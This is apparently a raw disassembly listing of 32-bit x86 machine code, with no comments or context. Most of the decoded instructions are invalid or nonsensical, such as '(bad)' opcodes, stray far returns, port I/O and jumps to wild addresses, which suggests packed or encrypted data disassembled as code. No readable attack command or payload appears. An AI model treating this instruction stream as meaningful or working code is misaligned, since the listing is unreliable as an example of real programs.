  40e5cd:	imul   ecx,edx
  40e5d0:	mov    DWORD PTR [ebp+0x8],edx
  40e5d3:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e5d6:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e5dc:	add    esi,DWORD PTR [ebx]
  40e5de:	mov    ah,0x3
  40e5e0:	inc    ebp
  40e5e1:	rdtsc  
  40e5e3:	xlat   BYTE PTR ds:[ebx]
  40e5e4:	pushf  
  40e5e5:	jge    0x40e570
  40e5e7:	xor    ebx,eax
  40e5e9:	sub    eax,DWORD PTR [ebp-0x73]
  40e5ec:	(bad)  
  40e5ed:	cmp    al,al
  40e5ef:	jb     0x40e576
  40e5f1:	add    al,bh
  40e5f3:	ror    DWORD PTR [ebp-0x7a],1
  40e5f6:	xor    edi,edi
  40e5f8:	add    edi,edi
  40e5fa:	jmp    0x40e649
  40e5fc:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e602:	dec    ebp
  40e603:	into   
  40e604:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e60a:	fwait
  40e60b:	shl    DWORD PTR [edx],cl
  40e60d:	retf   0x5588
  40e610:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e616:	add    eax,DWORD PTR [eax]
  40e618:	in     al,0x4d
  40e61a:	push   ebp
  40e61b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e621:	gs add ch,cl
  40e624:	dec    ebp
  40e625:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e62b:	dec    ebp
  40e62c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e632:	jge    0x40e602
  40e634:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e63a:	add    cl,dh
  40e63c:	dec    ebp
  40e63d:	dec    DWORD PTR [ebx-0x2c032375]
  40e643:	adc    BYTE PTR [ebp+0x1],0x8b
  40e647:	add    al,bl
  40e649:	jge    0x40e5d7
  40e64b:	push   0xffffff9b
  40e64d:	push   0x8b3032
  40e652:	shl    BYTE PTR [ebp+0x55],0x6a
  40e656:	xor    edi,edi
  40e658:	xor    edx,DWORD PTR [ebx+eax*1]
  40e65b:	inc    ebp
  40e65c:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e662:	dec    ebp
  40e663:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e669:	jbe    0x40e5f6
  40e66b:	mov    ebp,esp
  40e66d:	ror    bl,1
  40e66f:	enter  0x14ce,0xaf
  40e673:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e679:	push   ebp
  40e67a:	retf   0x5540
  40e67d:	push   ebp
  40e67e:	mov    esi,DWORD PTR [edx-0x1c]
  40e681:	mov    edx,ebx
  40e683:	cld    
  40e684:	(bad)  
  40e685:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e68c:	sti    
  40e68d:	add    dh,cl
  40e68f:	push   0xffffff94
  40e691:	call   FWORD PTR [ebx+0x3b5032d0]
  40e697:	mov    ecx,DWORD PTR [edi]
  40e699:	int3   
  40e69a:	pop    esi
  40e69b:	inc    ebp
  40e69c:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e6a2:	push   ebp
  40e6a3:	xor    esi,DWORD PTR [ebx]
  40e6a5:	mov    DWORD PTR [ebx],0xcace0f9c
  40e6ab:	aas    
  40e6ac:	push   ebp
  40e6ad:	inc    ebp
  40e6ae:	xor    edx,esi
  40e6b0:	add    edx,esi
  40e6b2:	mov    eax,DWORD PTR [ebx]
  40e6b4:	(bad)  
  40e6b5:	jmp    0x40e643
  40e6b7:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  40e6bd:	rol    ah,1
  40e6bf:	mov    esi,0xf133104d
  40e6c4:	mov    edx,0xff388d80
  40e6c9:	mov    dh,0xd1
  40e6cb:	cmp    edx,DWORD PTR [ebp+0xf]
  40e6ce:	mov    eax,DWORD PTR [edx-0x20]
  40e6d1:	add    BYTE PTR [ebp-0x75],bh
  40e6d4:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e6db:	fwait
  40e6dc:	retf   0x8632
  40e6df:	cmp    ebp,0x8
  40e6e2:	call   ebx
  40e6e4:	inc    ebp
  40e6e5:	inc    ebp
  40e6e6:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e6ec:	mov    esi,DWORD PTR [ecx]
  40e6ee:	enter  0x49c,0xc7
  40e6f2:	add    al,al
  40e6f4:	add    bl,al
  40e6f6:	(bad)  
  40e6f7:	clc    
  40e6f8:	enter  0x45,0x31
  40e6fc:	push   eax
  40e6fd:	pushf  
  40e6fe:	mov    edi,eax
  40e700:	int3   
  40e701:	or     al,al
  40e703:	test   DWORD PTR [edi],edi
  40e705:	clc    
  40e706:	gs inc ebp
  40e708:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e70e:	push   ss
  40e70f:	xor    ecx,DWORD PTR [ebp+0x3]
  40e712:	sub    edx,DWORD PTR [ecx-0x76]
  40e715:	dec    ebp
  40e716:	add    DWORD PTR [ebx+0x88d845],ecx
  40e71c:	mov    esi,DWORD PTR [ebx]
  40e71e:	or     BYTE PTR [ebx],al
  40e720:	cmp    edx,DWORD PTR [ecx-0x38]
  40e723:	dec    ebp
  40e724:	out    dx,eax
  40e725:	xor    eax,DWORD PTR [ebp+0x3]
  40e728:	mov    edx,DWORD PTR [ecx-0x28]
  40e72b:	dec    ebp
  40e72c:	add    BYTE PTR [ebx],dh
  40e72e:	push   0x518003
  40e733:	push   eax
  40e734:	add    BYTE PTR [ebx-0x300748b],cl
  40e73a:	sbb    BYTE PTR [ebp+0x45],cl
  40e73d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e743:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e749:	dec    ebp
  40e74a:	inc    ebp
  40e74b:	xor    edx,esi
  40e74d:	add    edx,esi
  40e74f:	push   ecx
  40e750:	(bad)  
  40e751:	dec    ebp
  40e752:	mov    al,ds:0xc5e03dff
  40e757:	retf   
  40e758:	(bad)  
  40e759:	into   
  40e75a:	sub    bh,bh
  40e75c:	dec    esp
  40e75d:	adc    al,0x9c
  40e75f:	inc    ebp
  40e760:	push   ebp
  40e761:	test   DWORD PTR [edi],ecx
  40e763:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  40e76a:	jmp    0xc9b9f67e
  40e76f:	add    cl,dl
  40e771:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e77b:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e781:	rol    BYTE PTR [eax],0x54
  40e784:	clc    
  40e785:	gs jb  0x40e78f
  40e788:	mov    eax,DWORD PTR [ebp-0x30]
  40e78b:	xor    al,0x40
  40e78d:	sub    al,0xc7
  40e78f:	mov    ah,ch
  40e791:	add    DWORD PTR [ebp+0x4534f845],eax
  40e797:	sub    al,0x80
  40e799:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e7a0:	mov    ch,0xff
  40e7a2:	clc    
  40e7a3:	add    DWORD PTR [ebp+0x60],0x3d
  40e7a7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e7ae:	inc    ebp
  40e7af:	dec    DWORD PTR [ebx-0x341ff701]
  40e7b5:	test   esi,ecx
  40e7b7:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e7bd:	push   eax
  40e7be:	add    DWORD PTR [ebp+0x0],eax
  40e7c1:	dec    ebx
  40e7c3:	or     al,0xce
  40e7c5:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e7cc:	into   
  40e7cd:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e7d3:	mov    esi,ecx
  40e7d5:	sar    bh,0x45
  40e7d8:	adc    al,0x8b
  40e7da:	clc    
  40e7db:	fadd   DWORD PTR [ebp+0x0]
  40e7de:	mov    ebp,DWORD PTR [edx+0x8]
  40e7e1:	push   edi
  40e7e2:	adc    BYTE PTR [eax+0x1],0x83
  40e7e6:	add    al,al
  40e7e8:	retf   
  40e7e9:	mov    ecx,esi
  40e7eb:	cld    
  40e7ec:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e7f2:	into   
  40e7f3:	add    BYTE PTR [ebx+0x756aec00],cl
  40e7f9:	jne    0x40e82e
  40e7fb:	inc    DWORD PTR [ebx]
  40e7fd:	rcl    BYTE PTR [ecx+0x50],1
  40e800:	push   eax
  40e801:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e807:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e80e:	sar    bh,0x84
  40e811:	or     BYTE PTR [ebx],al
  40e813:	push   eax
  40e814:	add    BYTE PTR [ebx+0x453cc845],cl
  40e81a:	pushf  
  40e81b:	xor    edi,eax
  40e81d:	pushf  
  40e81e:	mov    ah,0x89
  40e820:	test   eax,ebp
  40e822:	clc    
  40e823:	inc    ebp
  40e824:	inc    ebp
  40e825:	mov    DWORD PTR [eax+eax*8],esi
  40e828:	sub    al,0x32
  40e82a:	mov    BYTE PTR [ebx+ecx*4+0x54d8ec89],bl
  40e831:	dec    ebp
  40e832:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e836:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  40e83c:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e840:	or     DWORD PTR [ecx+0x45ff085c],0x0
  40e847:	shl    DWORD PTR [ebp-0x380064],1
  40e84d:	int3   
  40e84e:	lea    eax,[ebp+0x45fff860]
  40e854:	push   eax
  40e855:	cmp    al,0x75
  40e857:	pushf  
  40e858:	(bad)  
  40e859:	(bad)  
  40e85a:	pop    esp
  40e85b:	lods   al,BYTE PTR ds:[esi]
  40e85c:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e862:	mov    edi,DWORD PTR [esi]
  40e864:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e86b:	test   DWORD PTR [edi-0x8],edx
  40e86e:	inc    esi
  40e86f:	inc    ebp
  40e870:	add    BYTE PTR [eax],bh
  40e872:	push   0x8b809c
  40e877:	in     al,dx
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	mov    esi,DWORD PTR [ebx]
  40e87c:	cld    
  40e87d:	add    eax,DWORD PTR [eax+0xf013b]
  40e883:	adc    al,0x0
  40e885:	add    bh,bh
  40e887:	jmp    0xbde9a4
  40e88c:	add    BYTE PTR [ebp+0x45],cl
  40e88f:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e895:	dec    ebp
  40e896:	push   0x38033
  40e89b:	cmp    eax,DWORD PTR [eax]
  40e89d:	unpcklps xmm7,xmm0
  40e8a0:	jne    0x40e8a2
  40e8a2:	dec    DWORD PTR [ebx+0x5545cc18]
  40e8a8:	mov    DWORD PTR [ebx],esi
  40e8aa:	shl    BYTE PTR [ebx],1
  40e8ac:	inc    ebp
  40e8ad:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e8b3:	retf   0x5575
  40e8b6:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e8bc:	(bad)  
  40e8bd:	stc    
  40e8be:	in     al,dx
  40e8bf:	or     al,0x85
  40e8c1:	dec    ebp
  40e8c2:	clc    
  40e8c3:	xor    eax,DWORD PTR [ebp+0x3]
  40e8c6:	mov    ebp,ecx
  40e8c8:	rol    BYTE PTR [eax],1
  40e8ca:	inc    ebp
  40e8cb:	add    BYTE PTR [eax-0x7747ab3],bh
  40e8d1:	clc    
  40e8d2:	inc    ebp
  40e8d3:	retf   
  40e8d4:	mov    edx,ebx
  40e8d6:	in     al,dx
  40e8d7:	(bad)  
  40e8d8:	retf   
  40e8d9:	into   
  40e8da:	into   
  40e8db:	scas   eax,DWORD PTR es:[edi]
  40e8dc:	dec    ebp
  40e8dd:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e8e3:	sub    ecx,esi
  40e8e5:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e8e8:	(bad)  
  40e8e9:	mov    edi,eax
  40e8eb:	int3   
  40e8ec:	test   DWORD PTR [ecx-0x74baff08],ecx
  40e8f2:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40e8f9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e8ff:	(bad)  
  40e901:	retf   0x559c
  40e904:	(bad)  
  40e905:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40e90c:	inc    ebp
  40e90d:	add    eax,0xeb9c4d3f
  40e912:	(bad)  
  40e913:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40e919:	xor    ecx,DWORD PTR [ebp+0x33]
  40e91c:	mov    eax,DWORD PTR [ebx]
  40e91e:	call   0xce50b426
  40e923:	retf   0x55d1
  40e926:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40e92c:	jmp    0x40e927
  40e92e:	add    BYTE PTR ds:0xebf44d8b,al
  40e934:	push   ebp
  40e935:	mov    ebp,DWORD PTR [ebx]
  40e937:	mov    eax,0x33f8558b
  40e93c:	retf   
  40e93d:	xor    ecx,esi
  40e93f:	add    edx,ecx
  40e941:	add    eax,DWORD PTR [edx+0xca010f]
  40e947:	push   ebp
  40e948:	dec    ebp
  40e949:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40e94f:	stc    
  40e950:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e956:	scas   eax,DWORD PTR es:[edi]
  40e957:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40e95d:	xor    ebp,DWORD PTR [ebx]
  40e95f:	xor    edi,DWORD PTR [ebx]
  40e961:	add    esi,DWORD PTR [edi+0x3]
  40e964:	mov    ecx,DWORD PTR [edi]
  40e966:	clc    
  40e967:	retf   0x55cb
  40e96a:	into   
  40e96b:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40e972:	test   al,0x4d
  40e974:	push   ebp
  40e975:	jbe    0x40e9aa
  40e977:	mov    esi,DWORD PTR [ebx]
  40e979:	mov    al,0x3
  40e97b:	push   ebp
  40e97c:	add    esi,DWORD PTR [ebx]
  40e97e:	rdpmc  
  40e980:	retf   0x5503
  40e983:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40e989:	dec    ebp
  40e98a:	stc    
  40e98b:	mov    ecx,DWORD PTR [eax]
  40e98d:	or     BYTE PTR [ebp+0x4d],cl
  40e990:	jmp    0x134ea20
  40e995:	dec    ebp
  40e996:	dec    ebp
  40e997:	(bad)  
  40e998:	mov    ebx,esp
  40e99a:	clc    
  40e99b:	test   ebx,ecx
  40e99d:	clc    
  40e99e:	ror    DWORD PTR [ebp-0x2a],cl
  40e9a1:	mov    esi,ecx
  40e9a3:	lock scas eax,DWORD PTR es:[edi]
  40e9a5:	inc    ebp
  40e9a6:	mov    esi,DWORD PTR [ebx]
  40e9a8:	hlt    
  40e9a9:	pushf  
  40e9aa:	jge    0x40e937
  40e9ac:	sub    ebx,esp
  40e9ae:	cmp    ecx,ebx
  40e9b0:	ja     0x40e980
  40e9b2:	mov    ebp,DWORD PTR [eax-0x58]
  40e9b5:	dec    ebp
  40e9b6:	xor    ecx,DWORD PTR [di+0x3]
  40e9ba:	mov    esp,esp
  40e9bc:	clc    
  40e9bd:	push   ebp
  40e9be:	retf   
  40e9bf:	mov    dl,bl
  40e9c1:	adc    esi,edx
  40e9c3:	jb     0x40e993
  40e9c5:	add    BYTE PTR [edi-0xb7474b3],ch
  40e9cb:	lock jge 0x40e999
  40e9ce:	sub    ecx,DWORD PTR [ebp+0x3b]
  40e9d1:	mov    esi,DWORD PTR [edi-0x20]
  40e9d4:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  40e9db:	mov    BYTE PTR [ebx-0x34b20729],cl
  40e9e1:	mov    edx,ebx
  40e9e3:	lock (bad) 
  40e9e5:	ror    esi,cl
  40e9e7:	push   ebp
  40e9e8:	scas   eax,DWORD PTR es:[edi]
  40e9e9:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40e9ef:	fwait
  40e9f0:	sub    esi,DWORD PTR [edx]
  40e9f2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9f9:	xor    esp,DWORD PTR [ebx]
  40e9fb:	add    ecx,DWORD PTR [ebp-0x1c]
  40e9fe:	mov    edi,DWORD PTR [ebp-0x8]
  40ea01:	mov    bl,cl
  40ea03:	cmp    dl,bl
  40ea05:	jb     0x40e9d5
  40ea07:	add    dh,dl
  40ea09:	dec    ebp
  40ea0a:	scas   eax,DWORD PTR es:[edi]
  40ea0b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ea11:	shr    DWORD PTR [ebx],cl
  40ea13:	into   
  40ea14:	cmp    edx,esi
  40ea16:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ea1c:	dec    ebp
  40ea1d:	dec    ebp
  40ea1e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ea24:	retf   
  40ea25:	xor    edx,esi
  40ea27:	add    ecx,esi
  40ea29:	imul   ecx,edx
  40ea2c:	mov    DWORD PTR [ebp+0x8],edx
  40ea2f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ea32:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ea38:	add    esi,DWORD PTR [ebx]
  40ea3a:	rol    BYTE PTR [ebx],0x45
  40ea3d:	rdtsc  
  40ea3f:	xlat   BYTE PTR ds:[ebx]
  40ea40:	pushf  
  40ea41:	jge    0x40e9cc
  40ea43:	xor    esp,eax
  40ea45:	sub    eax,DWORD PTR [ebp-0x73]
  40ea48:	(bad)  
  40ea49:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ea50:	dec    ebp
  40ea51:	xchg   BYTE PTR [ebx],dh
  40ea53:	inc    DWORD PTR [ebx]
  40ea55:	(bad)  
  40ea56:	jmp    0x40eaa5
  40ea58:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40ea5e:	dec    ebp
  40ea5f:	into   
  40ea60:	mov    ebp,DWORD PTR [edi-0x23737420]
  40ea66:	fwait
  40ea67:	shl    DWORD PTR [edx],cl
  40ea69:	retf   0x5588
  40ea6c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40ea72:	add    eax,DWORD PTR [eax]
  40ea74:	in     al,0x4d
  40ea76:	push   ebp
  40ea77:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40ea7d:	gs add ch,cl
  40ea80:	dec    ebp
  40ea81:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40ea87:	dec    ebp
  40ea88:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40ea8e:	jge    0x40ea5e
  40ea90:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ea96:	add    cl,dh
  40ea98:	dec    ebp
  40ea99:	dec    DWORD PTR [ebx-0x2c032301]
  40ea9f:	inc    ebp
  40eaa0:	push   ebp
  40eaa1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40eaa7:	lea    ebx,[ebx-0x7400cdac]
  40eaad:	push   eax
  40eaae:	mov    ah,0x45
  40eab0:	push   ebp
  40eab1:	mov    esi,DWORD PTR [ebx]
  40eab3:	les    esi,FWORD PTR [ebx]
  40eab5:	add    BYTE PTR [ebx],al
  40eab7:	inc    DWORD PTR [ebx]
  40eab9:	mov    ecx,DWORD PTR [edi]
  40eabb:	cld    
  40eabc:	retf   0x4d80
  40eabf:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40eac5:	jne    0x40ea52
  40eac7:	(bad)  
  40eac8:	in     al,dx
  40eac9:	ror    bl,1
  40eacb:	scas   al,BYTE PTR es:[edi]
  40eacc:	into   
  40eacd:	add    BYTE PTR [edi-0xf2f7475],ch
  40ead3:	not    bl
  40ead5:	adc    al,0xca
  40ead7:	inc    ebp
  40ead8:	push   ebp
  40ead9:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40eadf:	push   0xaf80d6
  40eae4:	mov    eax,DWORD PTR [eax]
  40eae6:	fdiv   st(7),st
  40eae8:	sti    
  40eae9:	sbb    dh,cl
  40eaeb:	pop    esi
  40eaec:	xchg   esp,eax
  40eaed:	leave  
  40eaee:	fwait
  40eaef:	add    al,0x32
  40eaf1:	push   ebp
  40eaf2:	cmp    ebp,esp
  40eaf4:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40eaf8:	dec    DWORD PTR [ecx-0x740f0375]
  40eafe:	push   ebp
  40eaff:	cld    
  40eb00:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40eb06:	retf   0x558b
  40eb09:	clc    
  40eb0a:	xor    esi,eax
  40eb0c:	add    esi,DWORD PTR [ebp-0x75]
  40eb0f:	(bad)  
  40eb10:	hlt    
  40eb11:	or     cl,BYTE PTR [esi+eax*8-0x39cdf765]
  40eb18:	mov    DWORD PTR [edx],ecx
  40eb1a:	hlt    
  40eb1b:	(bad)  
  40eb1c:	dec    ebp
  40eb1d:	add    dh,BYTE PTR [ebx]
  40eb1f:	leave  
  40eb20:	mov    edx,0xffec8d55
  40eb25:	push   ecx
  40eb26:	rol    DWORD PTR [ebp+0x55],1
  40eb29:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40eb2f:	mov    eax,0xf8030b33
  40eb34:	lar    ecx,di
  40eb37:	push   ebp
  40eb38:	retf   0x863b
  40eb3b:	jne    0x40eb3a
  40eb3d:	mov    edi,edi
  40eb3f:	or     BYTE PTR [ebp+0x41],dh
  40eb42:	mov    ebp,edx
  40eb44:	cld    
  40eb45:	inc    eax
  40eb46:	mov    al,0x25
  40eb48:	add    DWORD PTR [ecx+0x0],eax
  40eb4b:	in     eax,dx
  40eb4c:	test   DWORD PTR [ecx-0x1],eax
  40eb4f:	(bad)  
  40eb51:	ret    0x8b
  40eb54:	cld    
  40eb55:	mov    eax,DWORD PTR [eax+0x8d0151]
  40eb5b:	clc    
  40eb5c:	xor    BYTE PTR [ebp+0x45],al
  40eb5f:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40eb65:	loopne 0x40eb66
  40eb67:	mov    edi,edi
  40eb69:	mov    ecx,eax
  40eb6b:	clc    
  40eb6c:	jne    0x40eb3e
  40eb6e:	call   0x81fc77
  40eb73:	and    eax,0xc6854575
  40eb78:	je     0x40eb7b
  40eb7a:	mov    eax,esi
  40eb7c:	cld    
  40eb7d:	or     DWORD PTR [eax+0x401c9],eax
  40eb83:	push   ebp
  40eb84:	add    ah,ch
  40eb86:	add    BYTE PTR [ecx+0x6a],dl
  40eb89:	inc    ebp
  40eb8a:	push   esi
  40eb8b:	mov    DWORD PTR [eax-0x4],edx
  40eb8e:	pop    edi
  40eb8f:	mov    ebx,DWORD PTR [ebx-0x4]
  40eb92:	ret    0xb8
  40eb95:	push   es
  40eb96:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40eb9c:	clc    
  40eb9d:	lock inc ebp
  40eb9f:	jne    0x40ebf7
  40eba1:	(bad)  
  40eba2:	jne    0x40eba8
  40eba4:	mov    eax,0xf841ba66
  40eba9:	fiadd  DWORD PTR [esi]
  40ebab:	(bad)  
  40ebac:	jne    0x40ebeb
  40ebae:	cmp    eax,ebx
  40ebb0:	pop    esi
  40ebb1:	mov    ecx,DWORD PTR [eax]
  40ebb3:	push   ecx
  40ebb4:	inc    ecx
  40ebb5:	lea    edi,[esi-0x8]
  40ebb8:	inc    edx
  40ebb9:	inc    ebp
  40ebba:	int    0x8b
  40ebbc:	inc    edx
  40ebbd:	cld    
  40ebbe:	jle    0x40eb7f
  40ebc0:	inc    ecx
  40ebc1:	xchg   eax,esp
  40ebc3:	mov    ebx,eax
  40ebc5:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ebcb:	or     edi,eax
  40ebcd:	inc    ebp
  40ebce:	inc    ebp
  40ebcf:	(bad)  
  40ebd0:	mov    ecx,DWORD PTR [eax]
  40ebd2:	cld    
  40ebd3:	(bad)  
  40ebd4:	jmp    0x40ebd7
  40ebd6:	mov    eax,esi
  40ebd8:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ebde:	rcl    BYTE PTR [esi+0xf],1
  40ebe1:	iret   
  40ebe2:	inc    ebp
  40ebe3:	leave  
  40ebe4:	(bad)  
  40ebe5:	dec    DWORD PTR [ecx]
  40ebe7:	mov    eax,esi
  40ebe9:	mov    eax,DWORD PTR [edi]
  40ebeb:	mov    dh,0xdd
  40ebee:	push   es
  40ebef:	nop
  40ebf0:	(bad)  
  40ebf1:	inc    DWORD PTR [ebx]
  40ebf3:	push   esi
  40ebf4:	leave  
  40ebf5:	iret   
  40ebf6:	add    al,0x46
  40ebf8:	push   ebp
  40ebf9:	jmp    0xff9241ea
  40ebfe:	inc    ebp
  40ebff:	push   esi
  40ec00:	mov    DWORD PTR [esi-0x4],eax
  40ec03:	in     eax,dx
  40ec04:	push   ebp
  40ec05:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ec0b:	add    al,BYTE PTR [edx]
  40ec0d:	mov    edx,DWORD PTR [ebp-0x17]
  40ec10:	cmp    edi,esi
  40ec12:	jne    0x40ec13
  40ec14:	(bad)  
  40ec15:	push   esi
  40ec16:	pop    es
  40ec17:	push   ebp
  40ec18:	mov    ebp,esp
  40ec1a:	or     BYTE PTR [ebp+0x41],al
  40ec1d:	add    edi,esp
  40ec1f:	sub    BYTE PTR [eax-0x4],al
  40ec22:	retf   0xc275
  40ec25:	add    DWORD PTR [eax],eax
  40ec27:	sbb    al,0x8b
  40ec29:	mov    edx,DWORD PTR [ecx+0x14]
  40ec2c:	lea    edx,[edx-0x1ba7508]
  40ec32:	push   esi
  40ec33:	enter  0xd375,0xb8
  40ec37:	test   DWORD PTR [esi],0x6ce0750
  40ec3d:	enter  0xd375,0x3b
  40ec41:	neg    DWORD PTR [esi+0x50]
  40ec44:	or     cl,dl
  40ec46:	inc    edx
  40ec47:	(bad)  
  40ec48:	loope  0x40ec36
  40ec4a:	(bad)  
  40ec4b:	sub    eax,DWORD PTR [ebx]
  40ec4d:	inc    eax
  40ec4e:	loope  0x40eca0
  40ec50:	add    dl,BYTE PTR [eax-0x37]
  40ec53:	push   edi
  40ec54:	push   ebp
  40ec55:	imul   ah
  40ec57:	adc    DWORD PTR [ecx-0x1],0x45
  40ec5b:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ec61:	lea    edi,[eax-0x7fff4ca]
  40ec67:	mov    eax,0x4550402
  40ec6c:	cmp    ebp,ecx
  40ec6e:	jne    0x40ec1b
  40ec70:	mov    eax,DWORD PTR ds:0x241e808
  40ec76:	in     eax,dx
  40ec77:	add    BYTE PTR [eax-0x7],al
  40ec7a:	out    0x36,eax
  40ec7c:	inc    ecx
  40ec7d:	aas    
  40ec7e:	jmp    0xccaf00
  40ec83:	lock mov edi,DWORD PTR [ebp-0x18]
  40ec87:	and    edi,edi
  40ec89:	mov    edi,edi
  40ec8b:	call   0xe40eed67
  40ec90:	push   es
  40ec91:	add    al,ch
  40ec93:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40ec9a:	(bad)  
  40ec9b:	hlt    
  40ec9c:	add    eax,0xffd3e87d
  40eca1:	cmp    bh,0x8
  40eca4:	(bad)  
  40eca5:	fld    DWORD PTR [esi]
  40eca7:	out    dx,al
  40eca8:	call   0xff9febb0
  40ecad:	cmp    al,0x46
  40ecaf:	shl    eax,0x8
  40ecb2:	(bad)  
  40ecb3:	pop    es
  40ecb4:	fisttp QWORD PTR [ebp+0xe577eff]
  40ecba:	push   ebx
  40ecbb:	add    BYTE PTR [ebx+0x24008b56],cl
  40ecc1:	add    BYTE PTR [ebp+0x50],al
  40ecc4:	push   eax
  40ecc5:	add    DWORD PTR [ebx+0x757d1834],ecx
  40eccb:	sub    edx,DWORD PTR [esi-0x24]
  40ecce:	jne    0x40ec86
  40ecd0:	lods   eax,DWORD PTR ds:[esi]
  40ecd1:	mov    edx,DWORD PTR [edx-0x34]
  40ecd4:	dec    esi
  40ecd5:	out    0x83,eax
  40ecd7:	into   
  40ecd8:	push   edi
  40ecda:	loopne 0x40ecaa
  40ecdc:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40ece0:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ece7:	rol    DWORD PTR [edx],0x8
  40ecea:	mov    esp,ecx
  40ecec:	cmp    DWORD PTR [ebx],0xc
  40ecef:	mov    esi,0x5001c0
  40ecf4:	push   eax
  40ecf5:	push   cs
  40ecf6:	push   eax
  40ecf7:	(bad)  
  40ecf8:	sub    edx,edi
  40ecfa:	push   esi
  40ecfb:	adc    al,0xcb
  40ecfd:	ins    DWORD PTR es:[edi],dx
  40ecfe:	mov    eax,0x203e8
  40ed03:	add    al,ah
  40ed05:	inc    esi
  40ed06:	mov    al,ch
  40ed08:	pop    es
  40ed09:	add    DWORD PTR [eax],0x1
  40ed0c:	add    dh,al
  40ed0e:	add    ah,ch
  40ed10:	rol    DWORD PTR [edx-0xd],1
  40ed13:	cli    
  40ed14:	push   0x4a
  40ed16:	pop    ecx
  40ed17:	retf   0xfe6
  40ed1a:	add    BYTE PTR [ebx-0x4e72f41e],al
  40ed20:	(bad)  
  40ed21:	dec    BYTE PTR [ebx+0x45b1fc72]
  40ed27:	(bad)  
  40ed28:	sub    ebp,DWORD PTR [ebx]
  40ed2a:	and    al,0x52
  40ed2c:	(bad)  
  40ed2d:	dec    edi
  40ed2e:	inc    ebp
  40ed2f:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  40ed36:	add    BYTE PTR [ebp-0x7b],dh
  40ed39:	pop    eax
  40ed3a:	add    BYTE PTR [edx+0x0],bl
  40ed3d:	pop    edx
  40ed3e:	dec    ebp
  40ed3f:	jmp    DWORD PTR [ebx]
